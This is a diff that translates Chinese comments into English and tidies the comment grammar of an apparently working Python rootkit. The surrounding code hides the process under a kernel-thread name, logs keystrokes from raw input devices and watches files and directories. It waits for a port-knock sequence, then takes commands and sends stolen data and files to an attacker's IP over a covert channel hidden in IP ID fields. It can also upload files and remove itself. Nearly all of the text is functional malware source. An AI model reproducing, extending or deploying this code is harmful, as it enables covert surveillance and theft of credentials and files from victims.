@@ -32,7 +32,7 @@ data_lock = threading.Lock()
 
 def get_local_ip(dest_ip, dest_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
+    # Use victim's UDP port (here COVERT_UDP_PORT) to probe
     s.connect((dest_ip, dest_port))
     local_ip = s.getsockname()[0]
     s.close()
@@ -40,11 +40,11 @@ def get_local_ip(dest_ip, dest_port):
 
 
 def hide_process():
-    """Hide process by changing its name."""
+    """Hide the process by changing its name."""
     try:
         libc = ctypes.CDLL("libc.so.6")
         PR_SET_NAME = 15
-        # Set name to something innocuous (limited to 16 bytes)
+        # Set the name to something innocuous (limited to 16 bytes)
         libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"kworker/0:1"), 0, 0, 0)
     except Exception:
         pass  # if this fails, not critical
@@ -58,7 +58,7 @@ def start_keylogger():
     # Find a keyboard event device
     kb_device = None
     try:
-        # Look for device with "Handlers...EV=120013" (keyboard event) in /proc/bus/input/devices
+        # Look for a device with "Handlers...EV=120013" (keyboard event) in /proc/bus/input/devices
         with open("/proc/bus/input/devices", "r") as f:
             content = f.read()
         # Each device info separated by blank line
@@ -90,7 +90,7 @@ def start_keylogger():
             keylog_active = False
             return
         # Each input_event is 24 bytes: (time_sec, time_usec, type, code, value)
-        # Here we read in chunks and parse the needed parts.
+        # Here we read in chunks and parse the necessary parts.
         while keylog_active:
             data = f.read(24)
             if not data or len(data) < 24:
@@ -158,7 +158,7 @@ def monitor_file(path):
         }).encode() + b"\n")
         return
 
-    # 通知监控已启动
+    # Notify that file monitoring has started
     send_covert_response(json.dumps({
         "type": "MON_FILE_STARTED",
         "path": path,
@@ -182,11 +182,11 @@ def monitor_file(path):
 
 def monitor_directory(path):
     """
-    监控目录：新增、删除、以及根目录下文件内容修改（mtime 变化）。
+    Monitor directory: additions, deletions, and content modifications (mtime changes) of top-level files.
     """
     try:
         prev_contents = set(os.listdir(path))
-        # 记录每个文件的上次修改时间
+        # Record the last modification time of each file
         prev_mtimes = {
             f: os.path.getmtime(os.path.join(path, f))
             for f in prev_contents
@@ -213,7 +213,7 @@ def monitor_directory(path):
             }) + "\n").encode())
             break
 
-        # 1) 新增文件
+        # 1) New file
         for fname in current_contents - prev_contents:
             ts = time.strftime("%Y-%m-%d %H:%M:%S")
             msg = {
@@ -224,7 +224,7 @@ def monitor_directory(path):
             }
             send_covert_response((json.dumps(msg) + "\n").encode())
 
-        # 2) 删除文件
+        # 2) Deleted files
         for fname in prev_contents - current_contents:
             ts = time.strftime("%Y-%m-%d %H:%M:%S")
             msg = {
@@ -234,10 +234,10 @@ def monitor_directory(path):
                 "timestamp": ts
             }
             send_covert_response((json.dumps(msg) + "\n").encode())
-            # 移除记录的 mtime
+            # Remove mtime record
             prev_mtimes.pop(fname, None)
 
-        # 3) 已存在文件的内容修改（mtime 变化）
+        # 3) Existing files modified (mtime changed)
         for fname in current_contents & prev_contents:
             full = os.path.join(path, fname)
             if not os.path.isfile(full):
@@ -263,6 +263,7 @@ def monitor_directory(path):
 
         prev_contents = current_contents
         time.sleep(1)
+
 
 
 
@@ -321,7 +322,7 @@ def uninstall_self():
         os.remove(script_path)
     except Exception:
         pass
-    # Send a confirmation to attacker (will do outside after calling this)
+    # Send a confirmation to the attacker (will do outside after calling this)
     # Exit the program
     os._exit(0)
 
@@ -339,10 +340,10 @@ def calc_checksum(msg):
 
 
 def send_covert_response(data_bytes):
-    """Send a response message back to attacker via covert channel (IP ID encoding)."""
+    """Send a response message back to the attacker via a covert channel (IP ID encoding)."""
     if ATTACKER_IP is None:
         return
-    # Prepare raw socket for sending (separate from listener raw)
+    # Prepare a raw socket for sending (separate from listener raw)
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     # Prepend length as 2 bytes
@@ -351,7 +352,7 @@ def send_covert_response(data_bytes):
     message = header + data_bytes
     if len(message) % 2 != 0:
         message += b'\x00'
-    # Use victim (this host) IP as source
+    # Use victim (this host) IP as a source
     # src_ip = socket.gethostbyname(socket.gethostname())
     src_ip = get_local_ip(ATTACKER_IP, COVERT_UDP_PORT)
     dst_ip = ATTACKER_IP
@@ -378,7 +379,7 @@ def send_covert_response(data_bytes):
                                 ver_ihl, tos, total_len, identification,
                                 flags_frag, ttl, proto, checksum, src_addr, dst_addr)
         # UDP header
-        src_port = 40000  # arbitrary source port on victim
+        src_port = 40000  # arbitrary source port on a victim
         dst_port = 55555  # port on attacker (could be anything, not actually used by a socket)
         udp_len = 8
         udp_checksum = 0
@@ -403,7 +404,7 @@ def main():
     raw_sock.settimeout(1.0)
     print("[*] Rootkit started, waiting for port knock sequence...")
     knock_index = 0
-    # Wait for correct knock sequence
+    # Wait for a correct knock sequence
     while True:
         try:
             packet, addr = raw_sock.recvfrom(65535)
@@ -411,7 +412,7 @@ def main():
             continue
         src_ip = addr[0]
         # Parse TCP packet to get destination port and SYN flag
-        # IP header is first 20 bytes (assuming no IP options)
+        # IP header is the first 20 bytes (assuming no IP options)
         if len(packet) < 20:
             continue
         ip_header = packet[:20]
@@ -428,7 +429,7 @@ def main():
         flags = tcp_hdr[5]
         syn_flag = flags & 0x02
         if syn_flag:
-            # Check if this port matches the next in sequence
+            # Check if this port matches the next in the sequence
             if dst_port == KNOCK_SEQUENCE[knock_index]:
                 knock_index += 1
                 if knock_index == len(KNOCK_SEQUENCE):
@@ -444,7 +445,7 @@ def main():
     raw_sock.bind(("0.0.0.0", 0))
     raw_sock.settimeout(1.0)
     print("[*] Waiting for commands from attacker...")
-    # Send an initial acknowledgment (pong) to confirm session establishment
+    # Send an initial acknowledgment (pong) to confirm a session establishment
     send_covert_response(b"PONG")
     # Command processing loop
     while True:
@@ -455,7 +456,7 @@ def main():
         src_ip = addr[0]
         if src_ip != ATTACKER_IP:
             continue
-        # Parse IP packet for UDP and extract IP ID
+        # Parse an IP packet for UDP and extract IP ID
         if len(packet) < 20:
             continue
         ip_header = packet[:20]
@@ -464,15 +465,15 @@ def main():
         if proto != socket.IPPROTO_UDP:
             continue
         ip_id = ip_fields[3]
-        # Reconstruct message using IP IDs
+        # Reconstruct a message using IP IDs
         # We need to accumulate chunks similar to commander
-        # We don't know how many packets per message up front until we read length from first chunk
+        # We don't know how many packets per message up front until we read length from the first chunk
         # One approach: since raw_sock.recvfrom returns one packet at a time, we need to assemble manually.
         # We'll do a simple approach: read multiple packets quickly to gather a full message.
-        # This loop already is reading one packet. We will build message by continuing to read until done.
-        # Start assembling message:
+        # This loop already is reading one packet. We will build a message by continuing to read until done.
+        # Start assembling a message:
         # The first packet we got is part of a message.
-        # Get first chunk from ip_id
+        # Get the first chunk from ip_id
         first_chunk = struct.pack(">H", ip_id)
         # Determine length from first two bytes
         expected_length = struct.unpack(">H", first_chunk)[0]
@@ -497,7 +498,7 @@ def main():
         data_bytes = data_bytes[:expected_length] if expected_length is not None else data_bytes
         if expected_length is None:
             continue  # if we never got a valid length, skip
-        # We have a complete message in data_bytes
+        # We have a complete message in the data_bytes
         # Process command
         try:
             command_str = data_bytes.decode('utf-8', errors='ignore')
@@ -511,9 +512,9 @@ def main():
         if command_str.startswith("CMD_PING"):
             send_covert_response(b"PONG")  # respond to ping
         elif command_str.startswith("CMD_DISCONNECT"):
-            # Simply break out of loop to return to knock wait or idle.
+            # Simply break out of the loop to return to knock wait or idle.
             print("[*] Disconnect command received. Returning to knock wait.")
-            break  # break out of command loop to essentially pause (we could implement re-knocking to resume)
+            break  # break out of the command loop to essentially pause (we could implement re-knocking to resume)
         elif command_str.startswith("CMD_UNINSTALL"):
             # Send confirmation and uninstall
             send_covert_response(b"Uninstalling... bye.")
@@ -534,7 +535,7 @@ def main():
             # Extract the header and content.
             try:
                 # separate header and content by first finding the end of header (which is after the colon following size)
-                # e.g. CMD_PUT:/tmp/test.txt:1234
+                # e.g., CMD_PUT:/tmp/test.txt:1234
                 parts = command_str.split(':', 2)
                 # parts[0] = 'CMD_PUT', parts[1] = <path>, the rest contains <size> and possibly file bytes when decoded as str it's truncated.
                 # Better to not rely on str for file content because binary could break. Instead, parse differently:
@@ -547,10 +548,10 @@ def main():
                 send_covert_response(b"ERR: PUT command parse error.")
             else:
                 path = parts[1].decode(errors='ignore')
-                # parts[2] starts with size until we hit the bytes of file. We know size as an ascii number, let's extract it.
+                # parts[2] start with size until we hit the bytes of a file. We know size as an ascii number, let's extract it.
                 size_bytes = b''
                 j = 0
-                # read digits in parts[2] until non-digit (which would be start of file bytes)
+                # read digits in parts[2] until a non-digit (which would be the start of file bytes)
                 while j < len(parts[2]) and chr(parts[2][j]).isdigit():
                     size_bytes += bytes([parts[2][j]])
                     j += 1
@@ -582,7 +583,7 @@ def main():
                 try:
                     with open(filepath, "rb") as f:
                         content = f.read()
-                    # Send file content as response (might be large; our protocol handles chunking internally)
+                    # Send file content as a response (might be large; our protocol handles chunking internally)
                     send_covert_response(content)
                 except Exception as e:
                     err_msg = f"ERR: Cannot read file: {e}"
@@ -627,8 +628,8 @@ def main():
             # Unknown command
             send_covert_response(f"ERR: Unknown command {command_str}".encode())
 
-    # If loop breaks (disconnect), we can either exit or go back to waiting for knock
-    # Here, we'll simply exit the program for simplicity, but could reset state and wait again.
+    # If the loop breaks (disconnect), we can either exit or go back to waiting for knock
+    # Here, we'll simply exit the program for simplicity, but could reset the state and wait again.
     sys.exit(0)
 
 
